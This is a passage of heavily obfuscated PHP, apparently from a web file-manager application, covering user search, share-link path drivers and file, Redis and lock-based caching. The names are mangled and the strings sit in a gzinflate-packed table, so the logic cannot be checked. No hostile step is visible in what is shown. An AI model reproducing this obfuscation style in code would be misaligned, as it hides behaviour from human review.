$¯àÂ’ó[2256] => array($¯àÂ’ó[459], "{$áøéÕÇ}\x25"), $¯àÂ’ó[1075] => $¯àÂ’ó[2070]); if (Input::check($áøéÕÇ, $¯àÂ’ó[387])) { $ÒÔ…óÖã[$¯àÂ’ó[1770]] = array($¯àÂ’ó[459], "{$áøéÕÇ}\x25"); $ÒÔ…óÖã[$¯àÂ’ó[2470]] = array($¯àÂ’ó[459], "{$áøéÕÇ}\45"); } if (!$áøéÕÇ) { $ÒÔ…óÖã = array(); } if (isset($şÎ½§«[$¯àÂ’ó[821]])) { $ÒÔ…óÖã[$¯àÂ’ó[821]] = $şÎ½§«[$¯àÂ’ó[821]]; } $ÒÔ…óÖã = $this->parseWhereLike($ÒÔ…óÖã); $¡¶æ×õ– = $this->_makeOrder()->where($ÒÔ…óÖã)->selectPage(20); if (!$¡¶æ×õ– || count($¡¶æ×õ–[$¯àÂ’ó[445]]) < 5 && Input::check($áøéÕÇ, $¯àÂ’ó[394])) { $„·Øü® = $this->_searchFromMeta($¯àÂ’ó[537], $áøéÕÇ, 10); $Â¯•ûÎú = $this->_searchFromMeta($¯àÂ’ó[538], $áøéÕÇ, 10); $Ğ”¹º¿‡ = array_merge($„·Øü®, $Â¯•ûÎú, $¡¶æ×õ–[$¯àÂ’ó[445]]); $¡¶æ×õ–[$¯àÂ’ó[445]] = array_unique_by_key($Ğ”¹º¿‡, $¯àÂ’ó[1770]); $¡¶æ×õ–[$¯àÂ’ó[442]][$¯àÂ’ó[443]] = count($¡¶æ×õ–[$¯àÂ’ó[445]]); $¡¶æ×õ–[$¯àÂ’ó[442]][$¯àÂ’ó[444]] = ceil($¡¶æ×õ–[$¯àÂ’ó[442]][$¯àÂ’ó[443]] / $¡¶æ×õ–[$¯àÂ’ó[442]][$¯àÂ’ó[439]]); } $this->_listDataApply($¡¶æ×õ–[$¯àÂ’ó[445]]); $this->_filterByGroup($¡¶æ×õ–, $İùƒµõ©); return $¡¶æ×õ–; } private function _filterByGroup(&$›£¸ÃóŞ, $çĞáß˜Ç) { $¥ä™Í× =& $_SERVER[¢ñàß¿€]; if (!$çĞáß˜Ç) { return $›£¸ÃóŞ; } foreach ($›£¸ÃóŞ[$¥ä™Í×[445]] as $¿®§ù¶ú => &$™ËŸ²ã°) { $£´µ«•® = array_to_keyvalue($™ËŸ²ã°[$¥ä™Í×[2159]], $¥ä™Í×[12], $¥ä™Í×[1968]); if (!in_array($çĞáß˜Ç, $£´µ«•®)) { unset($›£¸ÃóŞ[$¥ä™Í×[445]][$¿®§ù¶ú]); } } unset($™ËŸ²ã°); $›£¸ÃóŞ[$¥ä™Í×[445]] = array_values($›£¸ÃóŞ[$¥ä™Í×[445]]); $›£¸ÃóŞ[$¥ä™Í×[442]] = array($¥ä™Í×[2226] => count($›£¸ÃóŞ[$¥ä™Í×[445]]), $¥ä™Í×[2224] => $›£¸ÃóŞ[$¥ä™Í×[442]][$¥ä™Í×[439]], $¥ä™Í×[2223] => 1, $¥ä™Í×[2225] => 1); } private function _searchFromMeta($Å¥•ãüÍ, $üæ¤ÌÑ¢, $±©¨“›Ÿ) { $éúÕò» =& $_SERVER[¢ñàß¿€]; $üæ¤ÌÑ¢ = strtolower($üæ¤ÌÑ¢); $ğÏ‰ÎÈ = array($éúÕò»[97] => $Å¥•ãüÍ, $éúÕò»[450] => array($éúÕò»[459], "\45{$üæ¤ÌÑ¢}\x25")); $ğÏ‰ÎÈ = $this->parseWhereLike($ğÏ‰ÎÈ); $Çê™Ì»ò = Model($éúÕò»[2489])->where($ğÏ‰ÎÈ)->limit($±©¨“›Ÿ)->select(); if (!$Çê™Ì»ò) { return array(); } $Çê™Ì»ò = array_to_keyvalue($Çê™Ì»ò, $éúÕò»[12], $éúÕò»[1770]); $æ‡’³Œ = $this->where(array($éúÕò»[1761] => array($éúÕò»[7], $Çê™Ì»ò)))->select(); if (!$æ‡’³Œ) { return array(); } return $æ‡’³Œ; } private function _listDataApplyItem($âÊ¦•İˆ) { $ªüÎí² = array($âÊ¦•İˆ); $this->_listDataApply($ªüÎí²); return $ªüÎí²[0]; } private function _listDataApply(&$ÖÙ¥’¯Æ) { $ªÖğÂş‡ =& $_SERVER[¢ñàß¿€]; if (!$ÖÙ¥’¯Æ) { return; } array_remove_key($ÖÙ¥’¯Æ, $ªÖğÂş‡[964]); $› Œëñ× = array_to_keyvalue($ÖÙ¥’¯Æ, $ªÖğÂş‡[12], $ªÖğÂş‡[1770]); $this->_listAppendGroup($ÖÙ¥’¯Æ, $› Œëñ×); $this->_listAppendMeta($ÖÙ¥’¯Æ, $› Œëñ×); $this->_listAppendSourceRoot($ÖÙ¥’¯Æ, $› Œëñ×); } private function _listAppendSourceRoot(&$“Æ…ìÒ°, $—…–èŒ) { $¥í‚¤º =& $_SERVER[¢ñàß¿€]; $›ñ¹§™² = Model($¥í‚¤º[895])->listSourceRoot(SourceModel::TYPE_USER, $—…–èŒ); $›ñ¹§™² = array_to_keyvalue($›ñ¹§™², $¥í‚¤º[569]); $›ñ¹§™² = array_remove_key($›ñ¹§™², $¥í‚¤º[569]); foreach ($“Æ…ìÒ° as &$®üà¸¶ğ) { $®üà¸¶ğ[$¥í‚¤º[90]] = $›ñ¹§™²[$®üà¸¶ğ[$¥í‚¤º[1770]]] ? $›ñ¹§™²[$®üà¸¶ğ[$¥í‚¤º[1770]]] : array(); } unset($®üà¸¶ğ); } private function _listAppendGroup(&$Ş²˜™İø, $î ú¤³) { $£ğ±à÷Ø =& $_SERVER[¢ñàß¿€]; $’„Ò÷¯ = array($£ğ±à÷Ø[1770] => array($£ğ±à÷Ø[7], $î ú¤³)); $µÒ¯Ğ…¢ = Model($£ğ±à÷Ø[2062])->where($’„Ò÷¯)->select(); $Âá˜ŸªÕ = array_to_keyvalue($µÒ¯Ğ…¢, $£ğ±à÷Ø[12], $£ğ±à÷Ø[1968]); $Âá˜ŸªÕ = array_remove_value(array_unique($Âá˜ŸªÕ), $£ğ±à÷Ø[228]); if (!$Âá˜ŸªÕ || !$µÒ¯Ğ…¢) { return; } $’„Ò÷¯ = array($£ğ±à÷Ø[1968] => array($£ğ±à÷Ø[7], $Âá˜ŸªÕ)); $ìÀ·¥¿÷ = Model($£ğ±à÷Ø[2157])->field($£ğ±à÷Ø[2490])->where($’„Ò÷¯)->select(); $ìÀ·¥¿÷ = array_to_keyvalue($ìÀ·¥¿÷, $£ğ±à÷Ø[1968]); $µÒ¯Ğ…¢ = array_to_keyvalue_group($µÒ¯Ğ…¢, $£ğ±à÷Ø[1770]); foreach ($µÒ¯Ğ…¢ as &$¡íÊ›İ) { $¨ü‹§š‚ = array(); foreach ($¡íÊ›İ as $Œ¥È·†è) { if (!$Œ¥È·†è[$£ğ±à÷Ø[2076]]) { continue; } $äì€ÍÑÒ = Model($£ğ±à÷Ø[571])->listData($Œ¥È·†è[$£ğ±à÷Ø[2076]]); $¨ü‹§š‚[] = array($£ğ±à÷Ø[1968] => $Œ¥È·†è[$£ğ±à÷Ø[1968]], $£ğ±à÷Ø[2491] => $ìÀ·¥¿÷[$Œ¥È·†è[$£ğ±à÷Ø[1968]]][$£ğ±à÷Ø[32]], $£ğ±à÷Ø[584] => $ìÀ·¥¿÷[$Œ¥È·†è[$£ğ±à÷Ø[1968]]][$£ğ±à÷Ø[584]], $£ğ±à÷Ø[487] => $äì€ÍÑÒ); } $¡íÊ›İ = $¨ü‹§š‚; } unset($¡íÊ›İ); foreach ($Ş²˜™İø as &$ã‰Ñø£») { $ã‰Ñø£»[$£ğ±à÷Ø[2159]] = array(); if (isset($µÒ¯Ğ…¢[$ã‰Ñø£»[$£ğ±à÷Ø[1770]]])) { $ã‰Ñø£»[$£ğ±à÷Ø[2159]] = $µÒ¯Ğ…¢[$ã‰Ñø£»[$£ğ±à÷Ø[1770]]]; } } unset($ã‰Ñø£»); } public function userAppendGroup($õ¨Ğ¬¥) { $ùÁÓ—ó‰ =& $_SERVER[¢ñàß¿€]; if (!$õ¨Ğ¬¥) { return array(); } $this->_listAppendGroup($õ¨Ğ¬¥, array_to_keyvalue($õ¨Ğ¬¥, $ùÁÓ—ó‰[12], $ùÁÓ—ó‰[1770])); return $õ¨Ğ¬¥; } private function _listAppendMeta(&$ı¦æÑ, $ëà–Ë­ù) { $ÂÃûêÑ‡ =& $_SERVER[¢ñàß¿€]; $¿‘›ó—î = UserJobModel::JOB_KEY; $ÍâÉ®Œ = array($ÂÃûêÑ‡[2471]); $„ã¹ØêÍ = array($ÂÃûêÑ‡[1770] => array($ÂÃûêÑ‡[7], $ëà–Ë­ù)); $¯Ü•æû = Model($ÂÃûêÑ‡[2469])->where($„ã¹ØêÍ)->select(); $¯Ü•æû = array_to_keyvalue_group($¯Ü•æû, $ÂÃûêÑ‡[1770]); foreach ($¯Ü•æû as &$ı…Ï‘¡È) { $Ú¨†ğ¥ı = array(); foreach ($ı…Ï‘¡È as $«Òİç­Ò) { if (!in_array($«Òİç­Ò[$ÂÃûêÑ‡[97]], $ÍâÉ®Œ)) { $Ú¨†ğ¥ı[$«Òİç­Ò[$ÂÃûêÑ‡[97]]] = $«Òİç­Ò[$ÂÃûêÑ‡[450]]; } } $ı…Ï‘¡È = $Ú¨†ğ¥ı; } unset($ı…Ï‘¡È); $µòÁÑ‘ù = Model($ÂÃûêÑ‡[2492]); foreach ($ı¦æÑ as &$ÕóÜ£í½) { $é®…î”™ = array(); if (isset($¯Ü•æû[$ÕóÜ£í½[$ÂÃûêÑ‡[1770]]])) { $é®…î”™ = $¯Ü•æû[$ÕóÜ£í½[$ÂÃûêÑ‡[1770]]]; } $ÕóÜ£í½[$ÂÃûêÑ‡[2493]] = array(); if (isset($é®…î”™[$¿‘›ó—î])) { $ÕóÜ£í½[$ÂÃûêÑ‡[2493]] = $µòÁÑ‘ù->getUserJobInfo($é®…î”™[$¿‘›ó—î]); } } unset($ÕóÜ£í½); } protected function groupUserAll($ğáÕˆáĞ) { $ø¯ÑîÀá =& $_SERVER[¢ñàß¿€]; if (!$ğáÕˆáĞ) { return !1; } $Å‘¨È‰ä = Model($ø¯ÑîÀá[2062])->field($ø¯ÑîÀá[1770])->where(array($ø¯ÑîÀá[1968] => array($ø¯ÑîÀá[7], $ğáÕˆáĞ)))->select(); $Å‘¨È‰ä = array_to_keyvalue($Å‘¨È‰ä, $ø¯ÑîÀá[12], $ø¯ÑîÀá[1770]); return array_unique($Å‘¨È‰ä); } public function userSearch($¬Çß¼ù¤, $Ï×¼¦ğ£ = "\52") { return Model($_SERVER[¢ñàß¿€][598])->where($¬Çß¼ù¤)->field($Ï×¼¦ğ£)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\x5f\157\x70\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¤çÇÊš³) { $„Ì¬ş¬‚ =& $_SERVER[¢ñàß¿€]; $Ã¤Ÿ½‡î = defined($„Ì¬ş¬‚[2194]) && USER_ID ? USER_ID : $„Ì¬ş¬‚[12]; return "\x55\163\x65\x72\x4f\x70\x74\x69\157\x6e\x5f{$¤çÇÊš³}\x5f" . $Ã¤Ÿ½‡î; } protected function filterWhere($û’æŠúŞ) { $ë˜Î‘ÊÍ =& $_SERVER[¢ñàß¿€]; $û’æŠúŞ[$ë˜Î‘ÊÍ[1770]] = defined($ë˜Î‘ÊÍ[2194]) && USER_ID ? USER_ID : $ë˜Î‘ÊÍ[12]; return $û’æŠúŞ; } public function cacheRemoveUser($ŞËšğÆñ, $³æÆ¨İª) { return Cache::remove("\125\x73\145\162\117\160\164\151\157\x6e\137{$ŞËšğÆñ}\x5f" . $³æÆ¨İª); } protected function optionDefault($±ª„Ö•½ = '') { $ Ôû³Õ =& $_SERVER[¢ñàß¿€]; if ($±ª„Ö•½ == $ Ôû³Õ[12]) { return $GLOBALS[$ Ôû³Õ[6]][$ Ôû³Õ[2494]]; } if ($±ª„Ö•½ == $ Ôû³Õ[2495]) { return $GLOBALS[$ Ôû³Õ[6]][$ Ôû³Õ[2496]]; } } } goto dãÖ†‹…„â; aÏšàô·Ç·: class PathDriverDriverShareItem { public function __construct($€˜ÉÒÏ…) { $this->pathParse = $€˜ÉÒÏ…; } public function __call($şíîáÎˆ, $ä“íê¢ƒ) { $¶êÕÖøÔ =& $_SERVER[¢ñàß¿€]; if (method_exists($this, $şíîáÎˆ)) { return; } $ÑÄ×Ë€• = call_user_func_array(array($¶êÕÖøÔ[1423], $şíîáÎˆ), $ä“íê¢ƒ); $™¨ˆ…à = array($¶êÕÖøÔ[1424], $¶êÕÖøÔ[1425], $¶êÕÖøÔ[1426], $¶êÕÖøÔ[1427], $¶êÕÖøÔ[618], $¶êÕÖøÔ[620], $¶êÕÖøÔ[1428], $¶êÕÖøÔ[110], $¶êÕÖøÔ[1429], $¶êÕÖøÔ[1430]); if (in_array($şíîáÎˆ, $™¨ˆ…à)) { $ÑÄ×Ë€• = $this->getPathOuter($ÑÄ×Ë€•); } return $ÑÄ×Ë€•; } public function copy($š­æ…³, $ëƒÇ‡–İ, $æıùØÁÒ = false, $ñİÛ£Ë = false) { return $this->copyMove($š­æ…³, $ëƒÇ‡–İ, $æıùØÁÒ, $_SERVER[¢ñàß¿€][618], $ñİÛ£Ë); } public function move($¯¼…ï¨Ğ, $®ƒ½âá•, $ÉœÚ¶ÑÃ = false, $ÜŒŞ–ø° = false) { return $this->copyMove($¯¼…ï¨Ğ, $®ƒ½âá•, $ÉœÚ¶ÑÃ, $_SERVER[¢ñàß¿€][620], $ÜŒŞ–ø°); } private function copyMove($â­óŒÄµ, $Ä òåäÌ, $•œûŠëà, $·ıôüÓş, $«ğÉ§« = false) { $ê‹Ÿæ„Í =& $_SERVER[¢ñàß¿€]; $«æ ëø = $Ä òåäÌ; $‰ğŠ•î = IO::driverMake($Ä òåäÌ); if ($‰ğŠ•î->pathParse[$ê‹Ÿæ„Í[1229]]) { $Ä òåäÌ = $‰ğŠ•î->pathParse[$ê‹Ÿæ„Í[1229]]; } else { $Ä òåäÌ = $«æ ëø; } $Ş÷˜çÍ© = IO::copyMove($â­óŒÄµ, $Ä òåäÌ, $•œûŠëà, $·ıôüÓş, $«ğÉ§«); $Ş÷˜çÍ© = $this->getPathOuter($Ş÷˜çÍ©); return $Ş÷˜çÍ©; } public function pathThis($Áé¤İ´é) { return get_path_this($this->pathParse[$_SERVER[¢ñàß¿€][87]]); } public function pathFather($ƒºÒŒº) { return get_path_father($this->pathParse[$_SERVER[¢ñàß¿€][87]]); } public function iconvSystem($Ò†¶§ëõ) { return $Ò†¶§ëõ; } protected function infoParse($Ö››ÈÍ¯, $³Ø£å‹§ = false) { $à”ÜÑÔ” =& $_SERVER[¢ñàß¿€]; $ÄüË¬ÀŒ = $this->pathParse[$à”ÜÑÔ”[560]][$à”ÜÑÔ”[1254]] . $this->pathParse[$à”ÜÑÔ”[1247]]; if ($³Ø£å‹§) { $¶Ê¢œŠ  = IO::infoWithChildren($ÄüË¬ÀŒ); } else { $¶Ê¢œŠ  = IO::info($ÄüË¬ÀŒ); } $”æ±¸Éş = $this->pathParse[$à”ÜÑÔ”[560]]; return Action($à”ÜÑÔ”[1421])->_shareItemeParse($¶Ê¢œŠ , $”æ±¸Éş); } public function listAll($ˆŸ³—¨Ÿ) { $¼æÉÄ™¾ =& $_SERVER[¢ñàß¿€]; $É——Â÷ = IO::listAll($ˆŸ³—¨Ÿ); $¬¡’£© = rtrim($this->pathParse[$¼æÉÄ™¾[560]][$¼æÉÄ™¾[1254]], $¼æÉÄ™¾[8]); foreach ($É——Â÷ as &$íÁøæÅ) { $íÁøæÅ[$¼æÉÄ™¾[87]] = $this->pathDriver . $¼æÉÄ™¾[8] . ltrim(substr($íÁøæÅ[$¼æÉÄ™¾[87]], strlen($¬¡’£©)), $¼æÉÄ™¾[8]); } unset($íÁøæÅ); return $É——Â÷; } public function listAllSimple($¼‘Éà’Ÿ, $‰Ñãéæò = false) { $Ì³„±Îì =& $_SERVER[¢ñàß¿€]; $ØÌìïÍë = $this->listAll($¼‘Éà’Ÿ); $ĞÊæµáÖ = $this->pathParse[$Ì³„±Îì[495]]; if (trim($ĞÊæµáÖ, $Ì³„±Îì[8]) == trim(get_path_father($ĞÊæµáÖ), $Ì³„±Îì[8])) { $‰Ñãéæò = !0; } return IO::init($Ì³„±Îì[12])->listAllSimpleMake($ØÌìïÍë, $ĞÊæµáÖ, $‰Ñãéæò); } public function getPathOuter($å¡ÂÒ¨) { $šÇ¶¦»ù =& $_SERVER[¢ñàß¿€]; $û®Í©Òš = KodIO::parse($å¡ÂÒ¨); if ($û®Í©Òš[$šÇ¶¦»ù[33]] == KodIO::KOD_SHARE_ITEM) { return $û®Í©Òš[$šÇ¶¦»ù[87]]; } $¸òÆ°®ú = KodIO::clear($å¡ÂÒ¨); $ŒËğÒ­æ = KodIO::clear($this->pathParse[$šÇ¶¦»ù[560]][$šÇ¶¦»ù[1254]]); $î€‘ÎõŠ = substr($¸òÆ°®ú, strlen($ŒËğÒ­æ)); if (substr($¸òÆ°®ú, 0, strlen($ŒËğÒ­æ)) != $ŒËğÒ­æ) { return !1; } return $this->pathParse[$šÇ¶¦»ù[1248]] . $šÇ¶¦»ù[8] . ltrim($î€‘ÎõŠ, $šÇ¶¦»ù[8]); } public function getType() { $«Å»ÃÃç =& $_SERVER[¢ñàß¿€]; $ÙüÔ©üô = str_replace($«Å»ÃÃç[77], $«Å»ÃÃç[12], get_class($this)); return strtolower($ÙüÔ©üô); } public function isOsDriver($şçæ˜ßÍ) { return IO::isOsDriver($şçæ˜ßÍ); } public function info($œÛß­Åö) { return $this->infoParse($œÛß­Åö); } public function infoAuth($¦Ì÷Ì) { return $this->infoParse($¦Ì÷Ì); } public function infoWithChildren($­œåç’Æ) { return $this->infoParse($­œåç’Æ, !0); } public function infoFull($õ’…ÁÕà) { return $this->infoParse($õ’…ÁÕà); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($å«Âù°Ù) { $this->pathParse = $å«Âù°Ù; } protected function infoParse($ı§·éûç, $Õ…á­÷ê = false) { $Äêœûò =& $_SERVER[¢ñàß¿€]; return Action($Äêœûò[1253])->sharePathInfo($this->pathParse[$Äêœûò[87]], !0, $Õ…á­÷ê); } public function listPath($Ï•Ğ‡ˆ, $•ìå’Ôæ = false) { $ò…»Ğ =& $_SERVER[¢ñàß¿€]; $ôäÖÜƒª = IO::listPath($Ï•Ğ‡ˆ, $•ìå’Ôæ); if (!$ôäÖÜƒª) { return $ôäÖÜƒª; } if (is_array($ôäÖÜƒª[$ò…»Ğ[1422]])) { $ıïÛäëÚ = Action($ò…»Ğ[1431])->parsePathChildren($ôäÖÜƒª[$ò…»Ğ[1422]], array($ò…»Ğ[495] => $Ï•Ğ‡ˆ)); $ôäÖÜƒª[$ò…»Ğ[1422]] = Action($ò…»Ğ[1253])->shareItemInfo($ıïÛäëÚ); } foreach ($ôäÖÜƒª as $ñÍÆâı‰ => $¨ÏëáŞÆ) { if (!in_array($ñÍÆâı‰, array($ò…»Ğ[86], $ò…»Ğ[85]))) { continue; } foreach ($¨ÏëáŞÆ as $Ôí†ïÂ¨ => $ıïÛäëÚ) { $ıïÛäëÚ = Action($ò…»Ğ[1431])->parsePathChildren($ıïÛäëÚ, array($ò…»Ğ[495] => $Ï•Ğ‡ˆ)); $ôäÖÜƒª[$ñÍÆâı‰][$Ôí†ïÂ¨] = Action($ò…»Ğ[1253])->shareItemInfo($ıïÛäëÚ); } } return $ôäÖÜƒª; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¯â«å”) { parent::__construct($¯â«å”); $this->setSignVersion($_SERVER[¢ñàß¿€][247]); } } goto Cß…“µÏø®; a“äŒŸÁÙæ: define($_SERVER[¢ñàß¿€][0], $_SERVER[¢ñàß¿€][1]); $_SERVER[íÏõøÍÈ] = explode($_SERVER[¢ñàß¿€][2], gzinflate(substr($_SERVER[¢ñàß¿€][3], 10, -8))); function binCheckEq($³“ÜóÒâ, $©ö¾ÕÔ„) { return $³“ÜóÒâ == $©ö¾ÕÔ„; } goto cßÅºÓ´†–; eÍÁèªÕì˜: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $“šü§½Å =& $_SERVER[¢ñàß¿€]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ôí±¿ÂÓ = $GLOBALS[$“šü§½Å[6]][$“šü§½Å[425]]; $Å´Î…âˆ = $ôí±¿ÂÓ[$ôí±¿ÂÓ[$“šü§½Å[897]]]; $û°•ÁË = $ôí±¿ÂÓ[$“šü§½Å[898]]; switch ($ôí±¿ÂÓ[$“šü§½Å[897]]) { case $“šü§½Å[21]: self::$handle = Model($“šü§½Å[899]); break; case $“šü§½Å[900]: self::$handle = new CacheRedis($Å´Î…âˆ, $û°•ÁË); break; case $“šü§½Å[901]: self::$handle = new CacheMemcached($Å´Î…âˆ, $û°•ÁË); break; case $“šü§½Å[230]: self::$handle = new CacheFile($Å´Î…âˆ, $û°•ÁË); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($üó¯¢Û») { if (is_array($üó¯¢Û») || is_object($üó¯¢Û»)) { $üó¯¢Û» = json_encode($üó¯¢Û»); } $üó¯¢Û» = rawurlencode($üó¯¢Û»); return md5(KOD_SITE_ID . $_SERVER[¢ñàß¿€][11] . $üó¯¢Û»); } public static function get($¥û¹ĞÆ, $»Ğ±£ã¿ = false) { $íª çÕŒ = self::key($¥û¹ĞÆ); $‚âÕÖì± = self::init(); if ($»Ğ±£ã¿) { return unserialize($‚âÕÖì±->get($íª çÕŒ)); } if (!isset(self::$memoryCache[$íª çÕŒ])) { $óÄÛ®¿Ú = $‚âÕÖì±->get($íª çÕŒ); self::$memoryCache[$íª çÕŒ] = unserialize($óÄÛ®¿Ú); } return self::$memoryCache[$íª çÕŒ]; } public static function set($‹Ï®éå, $ĞèßùÓ—, $¯Ğ­„ö¤ = false) { $ñ³ÀÌƒÙ =& $_SERVER[¢ñàß¿€]; $¾µ‰Åñœ = self::key($‹Ï®éå); if (isset(self::$memoryCache[$¾µ‰Åñœ]) && self::$memoryCache[$¾µ‰Åñœ] === $ĞèßùÓ—) { return !0; } if ($¯Ğ­„ö¤ === 0) { self::$memoryCache[$¾µ‰Åñœ] = $ĞèßùÓ—; return !0; } $ôÌ§®Ï = self::init(); $ã±‡©üú = serialize($ĞèßùÓ—); CacheLock::lock($‹Ï®éå . $ñ³ÀÌƒÙ[902]); $ºÊ¡Ú…Õ = $ôÌ§®Ï->set($¾µ‰Åñœ, $ã±‡©üú, $¯Ğ­„ö¤); self::$memoryCache[$¾µ‰Åñœ] = $ĞèßùÓ—; CacheLock::unlock($‹Ï®éå . $ñ³ÀÌƒÙ[902]); return $ºÊ¡Ú…Õ; } public static function getCall($ÊÜÚ“µ, $Ã·ªÇú, $µâ×¸Ã, $ş¶¾ÃÈº = array()) { $ªî±‡¬© =& $_SERVER[¢ñàß¿€]; $¬úàÆáÖ = self::get($ÊÜÚ“µ); if ($¬úàÆáÖ || $¬úàÆáÖ === $ªî±‡¬©[12]) { return $¬úàÆáÖ; } $¬úàÆáÖ = call_user_func_array($µâ×¸Ã, $ş¶¾ÃÈº); $¬úàÆáÖ = $¬úàÆáÖ ? $¬úàÆáÖ : $ªî±‡¬©[12]; self::set($ÊÜÚ“µ, $¬úàÆáÖ, $Ã·ªÇú); return $¬úàÆáÖ; } public static function remove($ïúÖûô¾) { $²Ôì‘ü = self::key($ïúÖûô¾); unset(self::$memoryCache[$²Ôì‘ü]); self::clearTimeout(); CacheLock::lock($ïúÖûô¾); $ñíŒ‡ÕÜ = self::init()->remove($²Ôì‘ü); CacheLock::unlock($ïúÖûô¾); return $ñíŒ‡ÕÜ; } public static function removeMemory($Ö–‹è”¤) { $êô¹º”¶ = self::key($Ö–‹è”¤); unset(self::$memoryCache[$êô¹º”¶]); } public static function clearMemory($‘á¬Áœ™ = false) { if ($‘á¬Áœ™) { $‘á¬Áœ™ = self::key($‘á¬Áœ™); unset(self::$memoryCache[$‘á¬Áœ™]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¢ñàß¿€][903])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¢ñàß¿€][904])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ÑòÑ„‡ª, $ô Î©ï§) { $œã±“õ¢ =& $_SERVER[¢ñàß¿€]; $this->cachePath = $ÑòÑ„‡ª[$œã±“õ¢[87]]; $this->prefix = $œã±“õ¢[905]; $this->cacheTime = $ô Î©ï§; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ö‚ïıºì) { $ŸÌÅìÒø =& $_SERVER[¢ñàß¿€]; $ö‚ïıºì = str_replace(array($ŸÌÅìÒø[906], $ŸÌÅìÒø[100], $ŸÌÅìÒø[76]), $ŸÌÅìÒø[907], $ö‚ïıºì); return $this->cachePath . $ŸÌÅìÒø[908] . $ö‚ïıºì . $ŸÌÅìÒø[909]; } public function set($ÏÅ¹Ğ¬ç, $Ç‚ÙôĞ§, $î…äÔüš = false) { $î…äÔüš = $î…äÔüš ? $î…äÔüš : $this->cacheTime; $¼é±ö÷€ = $this->getFile($ÏÅ¹Ğ¬ç); if (file_put_contents($¼é±ö÷€, $this->prefix . $Ç‚ÙôĞ§, LOCK_EX)) { @touch($¼é±ö÷€, intval(time() + $î…äÔüš)); clearstatcache(); return !0; } @unlink($¼é±ö÷€); return !1; } public function get($ûÂß†ñ) { $±è¦¿Ùô = $this->getFile($ûÂß†ñ); if (file_exists($±è¦¿Ùô) && filemtime($±è¦¿Ùô) < time()) { @unlink($±è¦¿Ùô); return !1; } $«½àØ¬ = @file_get_contents($±è¦¿Ùô); return substr($«½àØ¬, strlen($this->prefix)); } public function remove($ÇÔ²º•©) { $ÎÛ¢Ê = $this->getFile($ÇÔ²º•©); return @unlink($ÎÛ¢Ê); } public function deleteAll() { $•¨ğä‡‚ =& $_SERVER[¢ñàß¿€]; $šŒš¼±Æ = scandir($this->cachePath); foreach ($šŒš¼±Æ as $á¬üÒğ) { $şƒ¬Ê˜† = $this->cachePath . $á¬üÒğ; if (strpos($şƒ¬Ê˜†, $•¨ğä‡‚[909]) && strpos($şƒ¬Ê˜†, $•¨ğä‡‚[910])) { @unlink($şƒ¬Ê˜†); } } } public function clearTimeout() { $ÌĞ±Ä¨¸ =& $_SERVER[¢ñàß¿€]; $áÆ€¢Ïå = scandir($this->cachePath); foreach ($áÆ€¢Ïå as $ä©ÃĞÁ²) { $¨Š‰Ÿ±× = $this->cachePath . $ä©ÃĞÁ²; if (strpos($¨Š‰Ÿ±×, $ÌĞ±Ä¨¸[909]) && strpos($¨Š‰Ÿ±×, $ÌĞ±Ä¨¸[910]) && filemtime($¨Š‰Ÿ±×) < time()) { @unlink($¨Š‰Ÿ±×); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $£—á¼Â¦ =& $_SERVER[¢ñàß¿€]; if (self::$handle) { return self::$handle; } $‚ªì°¼ = $GLOBALS[$£—á¼Â¦[6]][$£—á¼Â¦[425]]; self::$timeout = $‚ªì°¼[$£—á¼Â¦[911]] ? $‚ªì°¼[$£—á¼Â¦[911]] : 10; $Ùû·şÔ = _get($GLOBALS[$£—á¼Â¦[6]], $£—á¼Â¦[912]); $ËÀâÜâ¯ = $‚ªì°¼[$£—á¼Â¦[897]] ? $‚ªì°¼[$£—á¼Â¦[897]] : $£—á¼Â¦[230]; if ($ËÀâÜâ¯ == $£—á¼Â¦[21] && $Ùû·şÔ == $£—á¼Â¦[13]) { $ËÀâÜâ¯ = $£—á¼Â¦[230]; } switch ($ËÀâÜâ¯) { case $£—á¼Â¦[900]: self::$handle = new CacheLockRedis(); break; case $£—á¼Â¦[901]: self::$handle = new CacheLockMemcached(); break; case $£—á¼Â¦[21]: self::$handle = new CacheLockDatabase(); break; case $£—á¼Â¦[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($£—á¼Â¦[913], $£—á¼Â¦[914]); } return self::$handle; } private static function key($çŸñåë) { return $_SERVER[¢ñàß¿€][915] . Cache::key($çŸñåë); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ŸàœàÖ = '') { self::$errorMsg = $ŸàœàÖ; } public static function lockGlobal($Ø­ß¡‘˜, $ûîí×ø€) { return self::lock($Ø­ß¡‘˜, $ûîí×ø€, !0); } public static function lock($Ş¬ùšŞš, $ç‡÷±˜‹ = false, $’ÏâïŒò = false) { $í’¤óüş =& $_SERVER[¢ñàß¿€]; $ªî¼¼œ‘ = self::init(); $ùúÇû  = self::key($Ş¬ùšŞš); $ç‡÷±˜‹ = $ç‡÷±˜‹ ? $ç‡÷±˜‹ : self::$timeout; $¯ ş¡Şì = timeFloat(); $‰Ü´Õã“ = $ªî¼¼œ‘->lock($ùúÇû , $ç‡÷±˜‹); $ÓµæÈÀ… = timeFloat(); if (!$‰Ü´Õã“) { $±˜™ˆ± = "\x6c\x6f\143\x6b\x20\x65\x72\162\157\x72\x3b\x6b\x65\171\75{$Ş¬ùšŞš}\73\164\x69\155\145\x3d{$ç‡÷±˜‹}\x3b" . self::$errorMsg . $í’¤óüş[74] . get_caller_msg(); $Š°ö‹â¦ = LNG($í’¤óüş[916]) . "\x28{$ç‡÷±˜‹}\x73\51\56" . LNG($í’¤óüş[917]); $Š°ö‹â¦ .= $í’¤óüş[918]; if 